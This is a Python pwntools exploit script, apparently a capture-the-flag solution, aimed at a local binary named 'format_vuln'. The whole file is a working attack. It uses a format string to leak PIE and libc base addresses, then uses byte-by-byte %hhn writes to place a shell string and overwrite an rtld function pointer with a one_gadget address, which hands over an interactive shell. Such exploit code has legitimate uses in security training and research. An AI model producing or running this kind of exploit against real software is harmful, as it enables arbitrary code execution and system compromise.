from pwn import *

gdbscript = '''
b *main+173
b *_dl_fini+105
c
c 9
'''
io = gdb.debug("./format_vuln",gdbscript=gdbscript)
#io = process("./format_vuln")

#Function to get to the printf and send a format string
def send_format_string(fmt_string):
    io.recvuntil(b'2. Exit the loop\n')
    io.sendline(b'1')
    io.recvuntil(b'Please enter your input:\n')
    io.sendline(fmt_string)

def arb_write_8(addr,data):
    payload = b''
    if data == 0: #If the amount is 0, we shouldn't print anything before %n
        payload = f"%10$hhn".encode()
    else:
        payload = f"%{data}c%10$hhn".encode()
    
    #Calculate the padding for us to be able to put a pointer afterwards. The fmt_string for 8bit arbitrary write should never go over 16.
    padding = b'A'*(16-len(payload))
    payload+=padding

    #Add the pointer we want to write to
    payload+=p64(addr)

    # Send the payload
    send_format_string(payload)

def arb_write_64(addr,data):
    #Calculate all bytes to write
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
        ]
    #Write everything one byte at a time
    for i in range(0,len(to_write)):
        arb_write_8(addr+i,to_write[i])

send_format_string(b'%10$p %15$p') #Format string used to leak
leaks = io.recvline()[:-1].split(b' ') #cut off the newline at the end of the input and split it at the space

#Convert to integers
pieleak = int(leaks[0],16)
libcleak = int(leaks[1],16)

#Calculate base address
piebase = pieleak - 0x1260
libcbase = libcleak - 0x26d0a

log.info(f"PIE BASE: {hex(piebase)}")
log.info(f"LIBC BASE: {hex(libcbase)}")

rtld_funcptr_offset = libcbase + 0x217f68 #Get the ptr we can use to jump
one_gadget = libcbase + 0x000cb7db #Grab one_gadget

r14ptr = libcbase + 0x1c0ae8 #The ptr that r14 points to when hitting our gadget

arb_write_64(r14ptr,u64(b'0bin/sh\x00')) #0 instead of / since it subtracts 1 from the first character

arb_write_64(rtld_funcptr_offset, one_gadget) #Overwrite the rtld function ptr

io.interactive()